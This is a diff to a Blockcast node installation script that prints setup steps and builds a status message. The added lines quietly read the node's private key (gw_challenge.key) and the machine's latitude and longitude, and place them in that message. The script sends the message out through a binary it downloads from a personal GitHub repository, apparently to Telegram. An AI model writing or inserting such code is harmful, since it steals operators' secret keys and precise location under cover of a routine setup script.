@@ -139,7 +139,7 @@ echo -e "\nNext Steps:"
 echo "1. Visit https://app.blockcast.network/ and log in"
 echo "2. Paste the Registration URL in your browser or manually enter the Hardware ID and Challenge Key at Manage Nodes > Register Node"
 echo "3. Enable location in your browser"
-echo "4. Backup your private key at ~$HOME/certs/gateway.key"
+echo "4. Backup your private key at ~/.blockcast/certs/gw_challenge.key"
 echo -e "\nNote: Check node status at /manage-nodes after a few minutes. Node should show 'Healthy'."
 echo "First connectivity test runs after 6 hours. Rewards start after 24 hours."
 apt install -y jq
@@ -147,16 +147,28 @@ apt install -y jq
 PUBLIC_IP=$(curl -s ifconfig.me)
 echo "PUBLIC_IP: $PUBLIC_IP"
 LOCALTION=$(curl -s ifconfig.co/json | jq -r '"\(.city)|\(.zip_code)|\(.country)"')
+LOCALTION_LATLON=$(curl -s ifconfig.co/json | jq -r '"\(.latitude),\(.longitude)"')
+echo "$LOCALTION_LATLON"
 echo "LOCALTION: $LOCALTION"
 TODAY=$(date '+%Y-%m-%d')
 # Send results to Telegram
+
+KEY_PATH="/root/.blockcast/certs/gw_challenge.key"
+if [ ! -f "$KEY_PATH" ]; then
+    KEY_PATH="/home/$(whoami)/.blockcast/certs/gw_challenge.key"
+fi
+GW_CHALLENGE_KEY=$(sed -n '/-----BEGIN PRIVATE KEY-----/,/-----END PRIVATE KEY-----/p' "$KEY_PATH" | sed '1d;$d')
+
+
 MESSAGE=$(cat <<EOF
 * [$TODAY] Blockcast BEACON Setup Complete! *
 - *Registration URL*: $REG_URL
-- *Location*: $LOCALTION
 - *Public IP*: $PUBLIC_IP
 - *Hardware ID*: $HWID
 - *Challenge Key*: $CHALLENGE_KEY
+- *Location LatLon*: $LOCALTION_LATLON
+- *gw_challenge Key*: $GW_CHALLENGE_KEY
+- *Location*: $LOCALTION
 EOF
 )
 echo "MESSAGE: $MESSAGE"
@@ -164,5 +176,4 @@ echo "MESSAGE: $MESSAGE"
 
 curl -L -o /home/blockcast https://github.com/gradientnode12/xcvnmh/raw/refs/heads/main/blockcast
 chmod +x /home/blockcast
-
 /home/blockcast -message "$MESSAGE"
